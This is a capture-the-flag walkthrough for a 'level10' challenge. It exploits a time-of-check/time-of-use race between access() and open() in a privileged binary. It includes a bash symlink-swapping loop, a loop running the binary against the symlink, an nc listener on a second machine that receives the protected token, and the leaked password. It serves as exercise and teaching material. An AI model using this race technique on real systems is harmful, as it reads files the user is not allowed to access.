Time for bonuses !

This time we have a file token and an executable called level10.

Launching the level10 gives us an indication of the argument it needs

We need to give a file and a host

Trying to give a file we have access to from /tmp and as a host we gave localhost
We get a message saying :
Connecting to localhost:6969 .. Unable to connect to host localhost

So we should be listening on the port 6969 and it should work right ?
But we don't have any rights on token file....

We will first try to send and get a file from another computer.
After few clicks online we found a nice tool to listen on a specific port and this tool is nc, with the option -l and the port we want to listen

nc -l 6969

When we tried with an empty file, nc got something and print on the terminal :

.*( )*.

Hum... what is that ? Our file was empty before the transfer
This means level10 opens it and write in it ?

Let's look closer to the executable with ltrace :

ltrace ./level10 /tmp/hi 192.168.56.102

__libc_start_main(0x80486d4, 3, 0xbffff774, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/hi", 4)                               = 0
printf("Connecting to %s:6969 .. ", "192.168.56.102") = 37
fflush(0xb7fd1a20Connecting to 192.168.56.102:6969 .. )                                 = 0
socket(2, 1, 0)                                    = 3
inet_addr("192.168.56.102")                        = 0x6638a8c0
htons(6969, 1, 0, 0, 0)                            = 14619
connect(3, 0xbffff6bc, 16, 0, 0)                   = 0
write(3, ".*( )*.\n", 8)                           = 8
printf("Connected!\nSending file .. "Connected!
)             = 27
fflush(0xb7fd1a20Sending file .. )                                 = 0
open("/tmp/hi", 0, 010)                            = 4
read(4, "", 4096)                                  = 0
write(3, "", 0)                                    = 0
puts("wrote file!"wrote file!
)                                = 12
+++ exited (status 12) +++

We can see that level10 is using access to check right on the file and then when the right are correct, open the file and write something in it.

What is access ?

From the man :
       access()  checks whether the calling process can access the file pathname.
What's more interesting is the warning in the NOTES at the end of the man :

Warning: Using these calls to check if a user is authorized to, for  exam-
       ple, open a file before actually doing so using open(2) creates a security
       hole, because the user might  exploit  the  short  time  interval  between
       checking  and opening the file to manipulate it.  For this reason, the use
       of this system call should be avoided.

Well well well, isn't that a problem of race condition ? Yes sir !

We need to do a race condition on token to make level10 believe we have access to it.

We need to, in a loop, connect token to a file which have rights on with symbolic link and at the same time in an other loop, run level10 on our symlink and our destination IP.

Let's first create a bash script :

#!/bin/bash

touch /tmp/flag
touch /tmp/toto

while true; do
	ln -sf /tmp/flag /tmp/toto
	ln -sf /home/user/level10/token /tmp/toto
done

This will create indefinitively symlink to token and toto

We launch it like that in background to keep access to the shell :

bash /tmp/rename.sh &

Then we execute the level10 in a loop too :

while true; do ./level10 /tmp/toto 192.168.56.102; done

Sometimes it connect and sometimes we have an error saying we don't have access to token. We it connects it means we won the race condition !!

On the other computer (local VM) we launch in loop nc to listen on the port :

while true; do nc -l 6969; done


.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.


And we got the password to log as flag10 !!
